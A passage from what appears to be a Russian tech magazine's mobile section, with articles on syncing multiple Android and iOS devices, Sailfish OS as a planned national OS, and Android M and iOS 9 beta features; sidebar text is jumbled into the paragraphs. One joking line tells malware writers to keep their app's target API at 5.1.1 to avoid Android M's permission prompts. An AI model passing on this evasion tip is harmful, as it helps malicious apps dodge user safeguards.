  Под таким углом зрения стоит повнимательнее взглянуть на современный
мир, в котором поселились «живые» ассистенты Siri и Cortana, автономные «гу-
гломобили» и умные дома, управляемые термостатами Nest. Все это — отзвуки
идей энтузиастов зари компьютерной эры, подобных Эдмунду Беркли.
X-Mobile





ЗВЕРЬ О СЕМИ ГОЛОВАХ
НАЛАЖИВАЕМ СОВМЕСТНУЮ
РАБОТУ СМАРТФОНА,
                                                                        Максим Полевой
                                                                                                 maks.hatchet@yandex.ruПЛАНШЕТА, ANDROID И IOS




В последнее время стоимость мобильных устройств
стала настолько низкой, а их разнообразие настолько
большим, что у многих теперь не одно или два, а мно-
жество устройств самого разного класса, начиная
от простеньких смартфонов и умных часов за 50 дол-
ларов и заканчивая мощными планшетами. Все это
очень круто, и это то будущее, которого многие жда-
ли, однако синхронизировать работу такого количе-
ства гаджетов порой бывает непросто.

БОЛЬШЕ ДЕВАЙСОВ, ХОРОШИХ И РАЗНЫХ
Представь, что у тебя есть два Android-смартфона, один планшет на том же
Android и iPhone, который ты используешь время от времени. Первые два смар-
та — твои рабочие лошадки: один из них — большой и мощный фаблет, кото-
рый удобно юзать в машине, второй — достаточно простой аппарат поменьше,
который легко помещается в карман шортов и сопровождает тебя, когда ты на
своих двоих. Планшет большую часть времени находится дома, и ты использу-
ешь его для чтения книг, интернета и перемещения фигурок в игре Hitman Go.
   Реальное положение вещей, конечно же, может быть другим, но это доста-
точно типичная картина для техногика, и она идеально подходит для иллюстра-
ции всех тех проблем, с которыми сталкивается владелец множества гаджетов.
О каких проблемах я говорю? О диком перезвоне всех твоих гаджетов каждый
раз, когда приходит сообщение по электронной почте; о пропущенных вызо-
вах, когда звонок идет на тот девайс, который ты оставил дома; о необходимо-
сти вставать с мягкого дивана, когда ты получаешь СМС, лежа с планшетом на
мягком диване (да ладно, все мы лентяи); о необходимости проходить игру на
том девайсе, на котором ты начал в нее играть; о высаженной батарейке остав-
ленного дома гаджета (ведь он продолжает пробуждаться от каждого письма
или сообщения); о проблеме синхронизации контактов Google с iPhone.
  Я мог бы продолжать, но этого должно быть достаточно, чтобы пояснить,
зачем вообще я написал эту статью. Не обещаю, что после ее прочтения ты
сможешь исправить все эти проблемы разом, но многие из них будут решены.

ПРОБЛЕМА СИНХРОНИЗАЦИИ
Google и Apple сделали все, чтобы избавить нас от необходимости запоминать
десятки паролей и вручную настраивать синхронизацию каждого отдельно взя-
того приложения. Ты просто включаешь гаджет, один раз вбиваешь данные
своего аккаунта — и вуаля, все работает, письма приходят, сообщения отправ-
ляются, календарь напоминает о событиях. Сколько бы устройств к своему ак-
каунту ты ни подключил, все они будут автоматически синхронизированы с об-
лаком. Казалось бы, что еще нужно?
   Ну, во-первых, не все устройства должны быть полностью синхронизиро-
ваны с облачными сервисами Google, Apple и других компаний. Например, на
планшете я предпочитаю полностью отключать любые виды синхронизации.
В Android это можно сделать в меню «Настройки -> Аккаунты -> Сервис -> Ак-
каунт», в iOS — «Настройки -> Основные -> Обновление контента», а далее
отключить нужные приложения (также можно полностью отключить синхрони-
зацию с сервисами Apple в «Настройки -> Почта, адреса, календари -> Push»).
Синхронизацию приложений или Chrome, конечно, можно оставить, но такие
вещи, как Gmail или «Контакты», на планшете не особо и нужны. В конце концов,
почту можно проверить и вручную тогда, когда это будет удобно.
   Во-вторых, не все твои гаджеты необходимо синхронизировать всегда. Это
проблема того самого перезвона и расхода аккумулятора, когда синхрониза-
ция происходит даже в том случае, если она не нужна (например, когда ты дома
и, следовательно, оба твоих смартфона тоже). В этом случае можно либо от-
ключать синхронизацию на одном из устройств вручную, либо настроить хитрую
схему автоматического включения/выключения синхронизации и других нужных
функций, о чем я расскажу в следующем разделе.
   В-третьих, механизмы синхронизации Google и Apple никак не пересекаются.
То есть, например, ты не получишь автоматическую синхронизацию контактов
из аккаунта Google на iOS, а сервисы Apple не будут привязаны к Android-смарт-
фону. На iPhone эту проблему довольно легко обойти, либо установив прило-
жения Google (Gmail, Календарь, Google+), либо просто добавив привязку к ак-
каунту Google через настройки:
1. «Настройки -> Почта, адреса, календари -> Добавить учетную запись».
2. Выбираем Google и в открывшемся окне проходим стандартную веб-аутен-
   тификацию.
3. Выбираем сервисы, которые хотим синхронизировать: контакты, почта, ка-
   лендари, заметки.

Метод простой и удобный, а главное — работает в обе
стороны. По сути, центральным местом хранения контак-
тов будет Google, а iCloud станет вспомогательным.
   Что касается фоток и файлов, то здесь проще всего вос-
пользоваться Google+ или Carusel от Dropbox. Они отлич-
                                                        INFOно справляются с синхронизацией фотографий, а обычные
файлы можно при необходимости перемещать с помощью                                                                              Экспортировать
все того же Dropbox или любого другого аналога.                  контакты Google
   Однако здесь есть одна очень интересная деталь. Дело      можно, используя
                                                                      официальный сайт:в том, что обычный Dropbox для обеих платформ сильно                                                                                  «contacts.google.com
отличается от десктопного клиента и представляет собой     -> Еще -> Вернуться
просто навороченный просмотрщик веб-диска без функ-      к старой версии ->
                                                                Еще -> Экспорт».ции автоматической синхронизации. В Android эта пробле-
ма довольно легко обходится с помощью замечательного
приложения Dropsync, которое позволяет проводить выборочную двухсторон-
нюю синхронизацию каталогов по расписанию либо мгновенно — ровно так,
как это делает десктопный Dropbox. В iOS таких приложений не может суще-
ствовать из-за технических ограничений, наложенных компанией на сторонние
приложения. Поэтому придется либо самостоятельно перетаскивать нужные
файлики в Dropbox, либо делать джейлбрейк и выполнять двухстороннюю син-
хронизацию с помощью iFile, но только вручную, без возможности мгновенной
синхронизации.
   В-четвертых, синхронизация не работает в отношении настроек приложе-
ний. В большинстве случаев это не имеет никакого значения, так как мобиль-
ный софт в массе своей — это клиенты разного рода веб-сервисов, а те, что
работают обособленно, обычно никаких настроек и не требуют. Однако есть
целый класс программ, пользоваться которыми на разных устройствах без син-
хронизации настроек — одно мучение. Это не только игры, но и, например,
бук-ридеры, софт для разработки приложений, приложения, привязанные к но-
меру телефона (привет, WhatsApp!), да и просто сложный софт с множеством
настроек.
   Ни одна мобильная операционка «большой тройки» не умеет выполнять
синхронизацию настроек между несколькими устройствами. И это абсолютно
правильно, так как каждое устройство имеет свои особенности и те настрой-
ки, которые работают на планшете, вряд ли подойдут умным часам. Одна-
ко в случае с Android мы можем обойти эту проблему с помощью сторонних
приложений. Есть как минимум три
приложения, позволяющих такое ор-
ганизовать: Titanium Backup, Helium
и DataSync. По своему опыту могу ска-
зать, что корректно работает только
последний, к тому же он бесплатный.
   Итак, устанавливаем DataSync на
оба (три, четыре, сорок пять) устрой-
ства, соглашаемся дать ему права root
(а куда же без них). Оказавшись на
главном экране одного из устройств,
нажимаем + и выбираем те приложе-
ния, данные которых должны быть син-
хронизированы, и нажимаем на значок
дискеты внизу экрана. Так мы полу-
чим так называемый список синхрони-
зации. Чтобы отправить данные этих
приложений на другое устройство (или
же наоборот), нажимаем две стрелки
вверху экрана, выбираем устройство,
направление синхронизации и ждем —
все очень просто. Синхронизация вы-
полняется через локальную сеть, но
возможен и вариант импорта/экспор-
та настроек в облако Google Drive или
Dropbox. Само собой, синхронизация  Синхронизируем злосчастный WhatsApp
Android -> iOS невозможна.

ПРОБЛЕМА МЕСТОПОЛОЖЕНИЯ
С синхронизацией вроде разобрались. Переходим к более хардкорным вещам,
а именно — адаптивной подстройке устройств друг под друга. Напомню, наша
задача — избавиться от адского перезвона устройств, когда все они находятся
дома, а также настроить переадресацию вызовов, чтобы не пропустить звонок.
Вторая задача решается очень просто либо через сайт оператора (хорошая
идея — настроить переадресацию по схеме «Если абонент не берет трубку
в течение десяти секунд»), либо в настройках смартфона (Телефон -> Меню ->
Настройки -> Вызовы -> Переадресация вызова). На этом этапе, кстати, следу-
ет сразу выбрать «основное устройство с основной симкой»: во-первых, с него
будет вестись переадресация, а во-вторых, именно оно будет рабочим девай-
сом дома, тогда как все остальные устройства будут отключать любые виды
синхронизации в автоматическом режиме.
   Чтобы настроить такое автоматическое отключение, нам понадобится
Tasker. Его следует установить на все «вспомогательные» устройства. Далее
запускаем Tasker, нажимаем +, затем «Состояние -> Сеть -> Подключено к Wi-
Fi-сети», вбиваем SSID и нажимаем кнопку «Назад», после в выпавшем меню
нажимаем «Новая задача», указываем имя (пусть будет Sync Off), нажимаем +,
дальше «Сеть -> Автосинхронизация -> Установка -> Выключить», нажимаем
два раза «Назад».
   Такая настройка позволит устройствам автоматически отключать синхрони-
зацию с Google и другими сервисами тогда, когда они подключены к сети с ука-
занным SSID (это должна быть наша домашняя сеть). В итоге вся схема будет
выглядеть следующим образом:
•  основное устройство всегда будет синхронизироваться с веб-сервисами;
•  когда ты дома, остальные устройства будут отключать синхронизацию и не
   надоедать своими уведомлениями;
•  если ты вне дома не с «основным» устройством, оно будет включать син-
   хронизацию и ты сможешь получать звонки на основную симку благодаря
   переадресации.

Хорошей идеей может стать включение режима полета вместо отключения син-
хронизации, но начиная с версии 4.2 Android не позволяет это делать сторонним
приложениям (в нашем случае Tasker’у), поэтому придется получать root, ставить
Tasker-плагин под названием Secure Settings, активировать в нем модуль System+,
а затем вызывать его через Tasker («Плагин -> Secure Settings -> System+ Actions
-> Airplane Mode»). В общем и целом — не стоит овчинка выделки.





Плагин Secure Settings                    Профиль Tasker активен, а значит, синхро-
                                        низация отключена

СМС И ЗВОНКИ С ПЛАНШЕТА

Некоторые производители (привет, Sony и Apple) предлагают пользователям
своих устройств интересную функцию, позволяющую, например, начать на-
бирать СМС на смартфоне, затем продолжить на планшете и отправить СМС
с планшета, не оснащенного SIM-картой. Это действительно удобно, поэтому
неудивительно, что в маркете можно найти несколько приложений с подобной
функциональностью.
   Лучшее из них — Tablet Talk. Приложение с очень длинной историей разви-
тия и массой функций, включая возможность не только отправлять с планшета
СМС, но и даже совершать звонки. А главное: в отличие от аналогичных реше-
ний производителей устройств оно работает не через сервер компании, а на-
прямую, через Bluetooth или Wi-Fi-сеть. Так что пользоваться можно даже без
интернета.





Разработчик Tablet Talk явно любит общаться



ВЫВОДЫ
Работу с несколькими устройствами разных классов вполне можно сделать
удобной, и это отличный способ получить самое лучшее из нескольких миров.
Конечно, Android в очередной раз оказывается гораздо гибче техники Apple, но
справедливости ради стоит сказать, что Apple не навязывает только лишь свои
сервисы и iPhone вполне комфортно живет привязанным к Google. Лучше, ко-
нечно, быть не привязанным ни к кому, но это совсем другая история.
 X-Mobile
ОСЬ ДЛЯ РУСИ
ЗНАКОМИМСЯ С SAILFISH,
МОБИЛЬНОЙ ОС, ВЫБРАННОЙ
В КАЧЕСТВЕ НАЦИОНАЛЬНОЙ





                                                                                     Евгений Зобнин
                                                                                                                      androidstreet.net





15 мая 2015 года Министерство связи РФ опубли-
ковало пресс-релиз, в котором объявило о начале
формирования международного консорциума для
развития новой мобильной ОС для стран БРИКС.
В переводе на русский это означает, что реализация
плана импортозамещения все-таки началась, и вме-
сто забугорных андроидов и iOS’ов они таки хотят
свою ОС. И все бы ничего, посмеялись и разошлись,
да вот только, похоже, ребята настроены серьезно,
ибо в качестве базы для своей ОС они выбрали
на редкость вменяемую систему — Sailfish OS.

ВМЕСТО ВВЕДЕНИЯ
 Sailfish OS должна быть хорошо знакома всем, кто до сих пор юзает старые
 добрые Nokia N900 и Nokia N9. Да, это система для вас, чуваки, и вы уже, на-
 верное, успели сказать спасибо господину Никифорову. Всем остальным же
 придется сделать небольшой экскурс в историю, так как без него понять, что
 такое Sailfish OS и почему на нее молятся олдфаги и юниксоиды по всему миру,
 невозможно.
   Фактическая история Sailfish OS началась в далеком 2005 году, когда Android
 и iOS еще не существовали, а миром правила Nokia. Все началось с экспери-
 ментов. Symbian помирала, Windows Mobile всех бесила, и Nokia начала экспе-
 рименты с мобильным Linux, которые в результате вылились в карманный ком-
 пьютер Nokia 770 на базе новой ОС Maemo.
   Сама по себе Maemo, конечно, не была чем-то совершенно новым и пред-
 ставляла собой минималистичный Linux-дистрибутив со специально адапти-
 рованным для малых тач-экранов интерфейсом пользователя. Однако MeeGo
 стала одной из первых по-настоящему известных и популярных Linux-систем
 для наладонников, и, кроме Nokia 770, она перекочевала на следующие моде-
 ли карманных ПК Nokia — N800 и легендарный N900.
   Примерно в то же время свои собственные версии «карманного Linux» на-
 чали пилить и многие другие компании, включая Motorola, Google и Intel. И если
 наработки первых двух имели всем известный исход (в первом случае забве-
 ние, во втором — процветание), то у продукта Intel гораздо более интересная
 история жизни. Операционка под названием Moblin развивалась совместно
 с Linux Foundation как открытая стандартизованная Linux-платформа для мо-
 бильных устройств. Разработка шла без особого энтузиазма, и, чтобы не растра-
 чивать усилия впустую, в определенный момент Intel и Nokia договорились
 о слиянии Moblin и Maemo в единую платформу, получившую имя MeeGo.
   Новая система стала идейным продолжением Maemo и, в частности, была
 выпущена для N900 как обновление вместо намечавшегося ранее релиза
Maemo 6. Также система поддерживала множество недорогих нетбуков класса
 Asus EeePC и была предустановлена на коммуникатор Nokia N950, который так
 и не был пущен в массовое производство. Вскоре после этого Nokia благопо-
 лучно «продалась» Microsoft и закрыла подразделение, занимавшееся разра-
 боткой MeeGo, выпустив на прощание смартфон Nokia N9,
 до сих пор используемый многими энтузиастами.
   Потеряв  ключевого  партнера,  Intel  быстро  пере-
 метнулась к конкурентам и объявила о сотрудничестве
 с Samsung для продолжения разработки MeeGo как систе-
мы с HTML5-интерфейсом под названием Tizen. Туда же
                                                         INFO ушли и энтузиасты из Linux Foundation, а MeeGo перешла
 в руки сообщества и начала новую жизнь под именем MER                                                                       Основной из причин,
 (MEego Reconstructed).                                             побудившей Intel
  И здесь начинается самое интересное. Бывшие сотруд-       присоединиться
                                                                                      к разработке MeeGo,
 ники компании Nokia, ответственные за разработку Maemo                                                                     было отсутствие пол-
 и MeeGo, объединились и создали компанию Jolla, а в ка-    ноценной поддержки
 честве цели поставили создание системы, идейно близ-      процессоров Atom
                                                                                  в Windows 7. кой к MeeGo. Так на свет появилась Sailfish OS, представ-
ляющая собой тот самый MER, снабженный интерфейсом     Кроме Sailfish OS,
 и API на базе Qt 5 (никаких HTML и JS, только C++), набо-      платформа MER
                                                                                 используетсяром стандартных приложений, магазином софта и разного
                                                                               также в системах
 рода интересными плюшками вроде прозрачной интегра-                                                                                              Tizen, Plasma Active
 ции с Google, Facebook, Twitter и так далее.                      и Mer-дистрибутиве
                                                                 Nemo Mobile.
ЕЩЕ ОДНА МОБИЛЬНАЯ ОС?
 Sailfish OS не просто еще одна основанная на ядре Linux система (привет
 Android, webOS, Tizen, Firefox OS и всем остальным) — это самый настоящий
 дистрибутив GNU/Linux, способный без всяких проблем запустить весь тот
 софт, который мы привыкли видеть на Linux-десктопе. Это система с собствен-
 ной графической оболочкой, собственным SDK для разработки приложений,
 магазином софта, но это «настоящий Linux», построенный на тех же компонен-
 тах, что и любой настольный Linux-дистрибутив.
   При желании в Sailfish можно запустить десктопный Firefox, OpenOffice, кли-
 ент игры Xonotic или любой другой Linux-софт с поддержкой Wayland (в системе
 нет «иксов»). А если верить разработчикам, перенос десктопного софта, осно-
 ванного на Qt 5, в Sailfish OS отнимет не больше часа. Для тех, кому и этого мало,
 в Sailfish OS предусмотрен режим совместимости с Android-софтом, однако ра-
 ботает он только в сборках для официального смартфона Jolla, так как требует
 лицензионных отчислений в пользу компании Myriad Group за слой совместимо-
 сти Alien Dalvik (альтернативная реализация виртуальной машины Dalvik).





 Типичный Linux-дистрибутив…

    Linux-природа Sailfish не просто открывает путь к дей-
 ствительно сложным и уникальным приложениям с долгой
 историей развития — она позволяет опереться на огром-
 ное сообщество, отвечающее за развитие всех тех компо-
 нентов, которые составляют типичный Linux-дистрибутив.
 Jolla совсем не обязательно быть таким мастодонтом, как    WWW
 Google или Apple, чтобы поддерживать свою ОС в актуаль-
                                                                                Тот самый пресс-релизном состоянии. За инициализацию здесь отвечает уже при-                                                                          Минкомсвязи
 вычный линуксоидам systemd, за вывод звука — PulseAudio,
 мультимедиакодеки — GStreamer, да что там говорить, даже     Официальный сайт
 драйверы, и те можно взять из Android благодаря слою со-            Sailfish OS
 вместимости Hybris. Огромные команды разработчиков ра-                                                                             Проект Mer
 ботают на тебя, бери, пользуйся, главное — запили хоро-
ший графический интерфейс.
  И да, интерфейс здесь интересный и на редкость вменяемый. Это и не убун-
 товский UI с философией «мы сами знаем, что нужно юзеру, и делаем как хо-
 тим», и не полностью копирующий Android интерфейс Firefox OS. Это нечто стан-
 дартное и привычное, но при этом подслащенное весьма изобретательно
 сконструированными пилюлями. Экран блокировки здесь плавно перетекает
 в рабочий стол, а рабочий стол — в меню приложений. Вместо иконок и видже-
 тов на рабочем столе — нечто вроде миниатюр свернутых приложений, которые
 одновременно играют роль и миниатюры, и виджета. Выбирать пункты меню
 нужно, вытягивая экран вверх или вниз, а сам UI выполнен в минималистиче-
 ском, почти Metro’шном стиле с пронизывающим все и вся эффектом блюра.





 Это не виджеты, а свернутые приложения      Учетка Google легко подключилась,
                                       и система сразу начала синхронизацию

   Система легко и непринужденно интегрируется с десятком различных об-
 лачных сервисов, начиная от Google и заканчивая Flickr. Контакты, сообщения,
 письма, календарь — все это начинает синхронизироваться через стандарт-
 ные приложения, стоит только связать устройство с нужными сервисами. Почта
 Gmail сыплется в стоковое приложение «Почта», а сообщения Facebook отправ-
 ляются через приложение «Сообщения». Календарь собирает события сразу
 из нескольких мест, а галерея отображает фотографии из облачных хостингов.
     Sailfish OS красива, функциональна и очень удобна. Это почти идеальный
 вариант мобильной операционки, но есть в ней одна проблема: это ОС с за-
 крытым исходным кодом.

WTF?
 Когда министр Никифоров объявил о планах использовать Sailfish OS для им-
 портозамещения, кроме восторгов, можно было услышать и множество недоу-
 менных вопросов, касающихся выбора ОС с закрытым исходным кодом в каче-
 стве национальной мобильной операционной системы. Действительно, хотя
 платформа MER и является открытой в лучшем смысле этого слова — все, что
 находится в Sailfish OS уровнем выше (а это графическая оболочка, стоковые
 приложения, магазин софта и все те плюшки в виде бесшовной интеграции
 с веб-сервисами) — проприетарные и закрытые компоненты.
   Поначалу можно было предположить, что мы будем использовать Sailfish
 только в качестве платформы для гра-
 фической оболочки собственной раз-
 работки (и, как следствие, несовме-
 стимой с приложениями Sailfish OS).
 Однако, похоже, Минкомсвязи уда-
 лось договориться об открытии других
 частей системы: 27 мая Никифоров за-
 явил, что уже летом графическая обо-
 лочка и набор библиотек для ее фор-
 мирования будут полностью открыты
 (релиз 2.0). А вот будет ли открыт код
 стоковых приложений и код, отвечаю-
щий за интеграцию с веб-сервисами,
 пока неясно.
   В любом случае даже этого впол-
 не достаточно, чтобы в сжатые сроки
 построить собственную ОС на базе
 по-настоящему открытых и не привя-
 занных к отдельно взятой компании
 (как у Android) исходников. Вообще,
 Mer и Sailfish — это пример того, как
 должна развиваться открытая система.
В разработке и формировании плана
 развития здесь участвует сообщество,
 а управление проектом организова-
 но по принципу меритократии (так же,                                                       Sailfish доступна для многих устройств,
 как, например, в Debian GNU/Linux).     в том числе Nexus 4

ВЫВОДЫ
 Если честно, я был приятно удивлен выбором Минкомсвязи и желанием опе-
 реться на уже имеющиеся открытые разработки вместо криков в стиле «сдела-
ем свою ОС с гербом и флагами». Если оставить за скобками сам смысл идеи
 «национальной мобильной платформы», то Sailfish OS определенно правиль-
 ный выбор. Смущает лишь то, что господин Никифоров почему-то постоянно
 упоминает некую мифическую компанию Sailfish Holding с инвесторами по все-
 му миру и утверждает, будто именно она ответственна за разработку Sailfish OS.
 Найти информации об этой компании мне не удалось, и я могу только предпо-
 ложить, что пока есть только некоторая договоренность о создании холдинга,
 в который в будущем войдет и Jolla.
 X-Mobile





БИТВА ТИТАНОВ
НОВШЕСТВА ANDROID M И IOS 9
                                                                                     Евгений Зобнин
                                                                                                                      androidstreet.netBETA С ТОЧКИ ЗРЕНИЯ ГИКА




Честно говоря, я не смотрел ни Google I/O, ни WWDC
2015. Это цирк-шапито, а не серьезные презента-
ции для разработчиков — много болтовни и громких
слов и почти нет осмысленной информации.
Вместо этого я подождал несколько дней и пошел
читать техническую документацию (и поставил оси
на свои аппараты). Конечно же, изменений оказа-
лось гораздо больше, чем было озвучено. В этой
статье я хочу сделать акцент на наиболее значимых
из них и разъяснить, что же они несут нам, техноги-
кам. Да, статья во многом субъективна, но это ста-
 тья, а не просто новость на сайте.

ANDROID M
 Первой нам показали Android M — уже вторую версию Android с закодирован-
ным именем и нестабильной preview-версией (первой была L — 5.0 Lollipop).
 Пять наиболее важных новшеств этой версии ОС:
 •  давно ожидаемая система отзыва полномочий у приложений;
 •  механизм энергосбережения Doze;
 •  система контекстного поиска на основе Now on Tap;
 •  механизм подключения SD-карты в качестве полноценной внутренней па-
   мяти Adaptable Storage;
 •  бэкап данных приложений каждые 24 часа.

 Плюс куча более мелких изменений, такие
 как вертикальное отображение в меню при-
 ложений, возможность перемещения иконок
 в меню быстрых настроек, поддержка скане-
 ров отпечатков пальцев, многооконный ре-
жим (!!!) и множество других, о которых мы
 говорить не будем.
    Итак, система отзыва полномочий у при-
 ложений. Годами ожидаемая функциональ-
 ность, повторяющая аналогичную в iOS: при-
 ложение запрашивает доступ, ну, скажем,
 к микрофону, а юзер может его подтвердить
 или запретить. Все хорошо, все счастливы,
 но, как оказалось, есть в этой системе не-
 сколько нюансов, которые могут показаться
 очень странными.
   Во-первых, среди восьми групп полномо-
 чий (таких как камера, микрофон и так далее)
 нет едва ли не самого важного — интерне-
 та. Да-да, вирус не сможет получить доступ
 к твоим эсэмэскам и не узнает местополо-
 жение, но интернет ему доступен в полной
 мере. Это попустительство Google ради за-
 работка на рекламе, но в то же время и до-                                              WhatsApp больше не будет
 вольно большая дыра в безопасности (уве-  следить за тобой
 рен, ребята из CyanogenMod это исправят).
   Во-вторых, система запроса полномочий не работает в отношении прило-
 жений, созданных для прежних версий ОС. Суть в том, что приложение должно
 уметь корректно обрабатывать ситуации отказа в предоставлении полномочий,
 а уже существующий софт этого не умеет. Так что, господа вирусописатели, ни-
 когда не выставляйте версию «target API» выше 5.1.1, и все у вас будет хорошо.
 Радует, однако, то, что полномочия таки можно будет отозвать, но только через
 настройки и без всяких гарантий, что софтина не упадет (кстати, система отзы-
 ва полномочий в CyanogenMod именно так и работает) .
   Теперь о механизме Doze. Это такой новый энергосберегающий режим, по-
 зволяющий существенно снизить потребление энергии во время долгого сна
 устройства. Принцип его работы очень прост: если юзер долгое время не ис-
 пользует девайс, система отключает всем приложениям доступ в интернет, иг-
 норирует их просьбы разбудить устройство (wakelock’и и alarm’ы), отключает
 поиск новых сетей Wi-Fi и синхронизацию данных. Единственный для приложе-
 ния способ пробудиться — это получить высокоприоритетное push-уведомле-
 ние через систему GCM (Google Cloud Messaging). По словам Google, Doze по-
 зволяет сократить энергопотребление устройства до двух раз, и компания даже
 заявляет, что проводила тестирование на двух Nexus 9 с Android 5.1 и Android
 M. Что ж, попробуем поверить, сказки мы любим.
   Следующее — Adaptable Storage. Механизм, позволяющий подключить
 SD-карту или USB-флешку в качестве дополнительной внутренней памяти
 и переместить на нее данные всех приложений. Это некое подобие механизма
 AppsOnSD, появившегося еще в 2010 году, с той разницей, что вместо пере-
 носа отдельно взятых приложений происходит полное переформатирование
 карты памяти с шифрованием и перемещение на нее данных вообще всех при-
 ложений, а не только тех, что поддерживают функцию AppsOnSD. По сути, это
 своеобразный вариант известного хака Ext2SD, но с шифрованием.
   Четвертое — бэкап данных приложений. Едва ли не более ожидаемая функ-
 ция, чем система отзыва полномочий. Каждые 24 часа, находясь на зарядке,
 подключенный к сети Wi-Fi девайс выполняет синхронизацию данных приложе-
 ний. Все данные сохраняются в зашифрованных контейнерах в твоем Google
 Drive. Однако на каждый контейнер есть ограничение в 25 Мбайт (по крайней
 мере пока). После сброса до заводских настроек или переустановки прошивки
 данные восстанавливаются вместе с приложениями. Просто, удобно, содрано
 у Windows Phone.
  И наконец, гвоздь нашей программы Now on Tap — невероятно крутое
 расширение Google Now, из-за которого даже такой маргинал, как автор дан-
 ной статьи, готов начать пользоваться этим
 сервисом. Если вкратце, суть обновления
 Google Now в том, что теперь он включает
 в себя своего рода систему контекстного
 поиска, которая способна вычленять ключе-
 вые слова или фразы из окна запущенного
 в текущий момент приложения и автомати-
 чески выводить на экран их значения со всей
 сопутствующей информацией. Например,
 если девушка пишет тебе в чате «Пойдешь
 на фильм „Марсианин“?», а ты, к своему же
 удивлению, не знаешь, что это за фильм, то
 все, что тебе необходимо сделать, — пару
 секунд удерживать кнопку «Домой», и внизу
 экрана появится Google Now с подсказкой
 о фильме, ссылками на Википедию, IMDB
 и другой инфой.
   Более того, Now on Tap распознает даже
 изображения и воспринимает голос, так что,
 видя на экране картинку славного Калинин-
 града, можно просто сказать: «Покажи мне
 больше фоток этого места», — и он это пой-
 мет. Также можно спрашивать про музыкаль-
 ные композиции и другие сущности. Правда,
 в России это все работает пока не так хоро-                                       Now On Tap способен даже показать,
 шо, как в странах загнивающего Запада.       куда пойти ужинать





 Пока ты спишь, Doze работает

IOS 9 BETA
 Почти через две недели после презентации Android M компания Apple предста-
 вила бета-версию iOS 9, релиз которой намечается на сентябрь. Как и в случае
 с операционкой от Google, нововведений в новой iOS оказалось огромное ко-
 личество, но опять же мы поговорим только о пяти из них:
 •  совершенно новый ассистент Proactive;
 •  многооконный режим для iPad;
 •  энергосберегающий режим;
 •  новая система обновления приложений/ОС
 •  и, конечно же, watchOS 2.0, которая наконец-то научилась запускать прило-
   жения.

О новой клаве, приложении News и музыкальном сервисе говорить не будем.
    Итак, Proactive: наверное, самая обсуждаемая фича iOS 9. Proactive роди-
 лась в результате поглощения «Эпплом» компании — разработчика умного ас-
 систента Cue, созданного под впечатлением от Google Now, и компании — раз-
 работчика Spotsetter — социально ориентированного поисковика ресторанов,
 баров, кафе и прочих макдаков. В результате у Apple появился собственный
 ассистент, по функциональности сильно напоминающий все тот же гугловский
 Now. Он даже находится с левой стороны SpringBoard и показывает схожую ин-
 формацию, будь то расписание рейсов, напоминания о встречах или ближай-
шие кафе.
   Однако есть у Proactive и серьезное отличие. В то время как Google Now
 почти полностью завязан на поисковый движок и веб-сервисы все той же ком-
 пании, Proactive в большей степени полагается на информацию, хранящуюся
 в самом смартфоне, и даже предоставляет разработчикам сторонних при-
 ложений API для отдачи данных системе. Вся эта информация агрегируется,
 сортируется и предоставляется пользователю в нужное время вместе с реле-
 вантными данными, взятыми из интернета. Но, что самое интересное, Proactive
 не просто собирает эту информацию — он ведет своего рода хронику работы
 юзера со смартфоном и, например, предлагает нужные приложения в те мо-
 менты, когда тот их обычно использует, или запускает музыку в том приложе-
 нии, которое пользователь предпочитает.
   Второе — многооконный режим. Тут сказать особо нечего, все видели, все
 подивились. Единственное, что хотелось бы отметить, — в iOS наконец появи-
 лась настоящая многозадачность (в смысле переключения задач ядром ОС,
 а не юзером), позволяющая одновременную работу сразу нескольких приложе-
 ний. И судя по тому, что доступна она только на iPad Air 2, производительность
 для ее реализации должна быть нехилая (вот поэтому Android до недавнего
 времени и лагал). И да, сторонние приложения тоже смогут работать в таком
 режиме, но только после модификации.
   Теперь о системе обновления приложений и операционной системы, а точ-
 нее о том, как они позволяют сохранить трафик. Наверное, все знают, что в iOS
еще со времен пятой версии существует механизм инкрементальных обнов-
 лений. Работает он так: Apple смотрит на старую и новую версию приложения/
 прошивки, вычисляет, какие файлы изменились, а какие остались прежними
 (например, автор обновил код приложения, но все картинки оставил из преды-
 дущей версии), и при обновлении приложения/ОС отдает девайсу только то,
 что реально изменилось. Поэтому обновление 8.0 до 8.1 будет весить гораздо
 меньше, чем от 7.2 до 8.0. Такая же схема применяется в Android.
   В iOS 9 Apple существенно доработала этот механизм, снабдив его систе-
 мой, названной App Thinning. Состоит она из трех компонентов. Первый (App
 Slicing) позволяет устройству скачивать только те компоненты приложения, ко-
 торые ему нужны. Например, 32-битный iPhone 5 не будет качать исполняемые
 файлы для 64-битного iPhone 6, так же как iPhone 6 не будет скачивать ресур-
 сы приложения (изображения, например) для более крупного iPad Air. Вто-
 рой компонент (On-Demand Resources) позволяет устройству скачивать толь-
 ко часть ресурсов приложения, а не все целиком. Эта функция подходит для
 игр — зачем качать всю игру целиком, если можно скачать первые три уровня
 и оценить? Ну и последний компонент (Bitcode) позволяет разработчикам за-
 гружать приложения в App Store не в бинарном формате, а в виде промежуточ-
 ного байт-кода (на 99% уверен, что это байт-код LLVM). Собственно на нем
 и основан механизм App Slicing.
   Но это еще не все. Apple умудрилась улучшить и без того оптимизирован-
 ный механизм OTA-обновлений. По словам компании, для обновления до iOS 9
 понадобится всего 1,8 Гбайт, вместо 4,6 Гбайт в случае iOS 8. Как они это сде-
 лали — трудно сказать, но скорее всего, они применили один из вариантов би-
 нарной дельты. То есть если раньше система скачивала только те файлы, кото-
 рые изменились, то теперь она будет качать только патчи для этих файлов. Хотя
 это лишь предположения автора.
   Предпоследнее — режим энергосбережения. Тут ничего нового, полный
 аналог подобной функции из Android 5.0: нажимаешь на кнопочку, вся фоновая
 синхронизация данных отключается, яркость экрана устанавливается на ми-
 нимум, а сетевой канал сужается. В компании заявляют, что функция позво-
 ляет продлить жизнь смартфона на три часа
 (ну хоть не в два раза, спасибо) .
  И последнее — возможность запуска
 приложений в watchOS 2.0. Ты скажешь, что
 это можно было делать и в первой версии,
 и будешь не прав. WatchOS 1.0 не умела за-
 пускать приложения, она лишь выводила его
 интерфейс, тогда как вся логика оставалась
 на смартфоне. По большому счету часы были
 лишь тонким клиентом и без смартфона ока-
 зывались совсем беспомощными, за исклю-
 чением стоковых приложений. Теперь все
 по-взрослому, настоящий софт, способный
 работать без смартфона и даже использо-
 вать Wi-Fi. Забавно, но этим шагом Apple
 явно скопировала Стива Джобса, который
 представил первый iPhone без возможности
 запуска сторонних приложений и предложил
 использовать для этого веб-софт… в 2007
 году… по 2G… на экране 3,5 дюйма.
   Напоследок хотелось бы  сказать,  что
 Apple таки открыла язык Swift (в смысле — по-
